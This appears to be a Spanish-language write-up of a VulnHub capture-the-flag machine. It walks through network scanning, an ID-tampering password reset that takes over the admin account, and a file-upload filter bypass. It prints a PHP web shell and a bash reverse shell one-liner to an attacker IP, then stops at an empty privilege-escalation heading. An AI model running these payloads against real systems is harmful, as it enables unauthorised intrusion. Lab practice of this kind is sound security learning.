- Tags: #WebEnumeration #AbusoIDdeUsuario #AbusoDeFileUpload #VulnHub #linux 
_______
## Reconocimiento 
_____
al ser una maquina de VulnHub la cual desplegamos desde una maquina virtual tenemos que hacer un escaneo con **Arp-scan** de nuestra red para saber la **direccion IP** de la maquina victima y proceder con **Nmap**.

```arp-scap
arp-scan --localnet
```
_____
![](attachment/fbbd9526b807611614ef227e08d7493a.png)
____
```nmap
namp -p- --open -sS --min-rate 5000 -vvv -n -Pn <direccionIP> -oG allPort
```
____
luego de realizar el escaner con nmap nos arroja que tenemos tanto el puerto **22 (ssh)** como el puerto **80 (http)**, procedemos a realizar el escaner con los scripts de reconocimiento de nmap para finalmente ver a que nos enfrentamos.
____
```
nmap -p 22,80 <direccion_IP> -sCV -oN targete
```
___
![](attachment/2f6d159af111f5922c703ee37772bf73.png)
____
como resultado nos muestra que se esta corriendo en la web, no es mas que apache y ademas tenemos su versión, procedemos a verificar la web.

la pagina tiene el siguiente panel de login.
____
![](attachment/b728edf2381a93b137c9f9c5e6488bb5.png)
___
procedemos a registrarnos e ingresar, se nos muestra lo siguiente.
_____
![](attachment/cf03894a033ba354a372a3a1e29fc62f.png)
___
al parecer tenemos dos apartados que nos permite modificar los datos de nuestra cuenta, pero hay algo que llama la atención al instante y es que nuestro usuario esta identificado con el id 2, lo que significa que deben de haber mas usuarios.

pero antes de hacer algo mas, tratemos de enumerar directorios u otros subdominios a ver que vemos.

para eso usaremos la herramienta gobuster con un diccionario de secList.
______
```gobuster
gobuster dir -u http://<URL> o <DireccionIP>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```
____
aplicando el siguiente reconocimiento obtenemos que.
___
![](attachment/f00920bd461b65a55d9d7c985ed2646a.png)
____
todos son directorios validos los cuales podemos probar en la URL.

volviendo a lo que antes identificamos y es que el usuario se identifica por un ID, probemos capturar la petición de cambio de clave a ver que tal, todo esto utilizando BurpSuite.
___
![](attachment/8ff88fd10423b4cb2b6cc68e0e3026a7.png)
____
intentamos colocar en id el numero 1 y en clave colocamos una nueva a ver si funciona.
___
![](attachment/57fdd490e5f9d5d048cedfb79c97e4af.png)
____
y podemos observar que nos dice clave actualizada, ahora intentamos ingresar como admin.
____
![](attachment/35b7be41ba3f637e50e6afee9fa5aba4.png)
_____
con las credenciales admin y la clave que cambiamos desde BurpSuite ingresamos como admin de la pagina. Se observa que tiene un apartado de subida de archivo, la cual probamos y admite solo JPG, PNG Y GIF pero no hay que fiarse.

con BurpSuite haremos un ataque tipo sniper para poder ver que exenciones php son validas y si las hay.
______
![](attachment/a7d2cc1b9905d3eb83eab21a5d9164ad.png)
___
cualquier otra extensión php sirve, en este caso es nos funciona el .phar, asi que haremos nuestros archivo cargado con una reverse shell que nos permitirá ejecutar comando.
___
```php
<?php
 echo "<pre>" . shell_exec(&_GET['cmd']) . "</pre>";
?>
```
___
esa sera la estructura de nuestro archivo el cual tendrá como nombre **reverse.phar** y es el archivo que cargaremos.

una vez cargado el archivo podremos verlo en el apartado de `http://<direccionIP>/upload/archivo.phar` y de ahí ejecutar nuestro codigo. 
____
![](attachment/219785d0ff739195209ff2df213fea41.png)
____
y es así que podremos entablar una reverse shell con nuestra maquina de atacante.

con bash: `bash -c "bash -i >%26 /dev/tcp/192.168.0.103/443 0>%261"`

y es así como nos conectamos a la maquina victima.
____
## Escalada de Privilegios 
_____

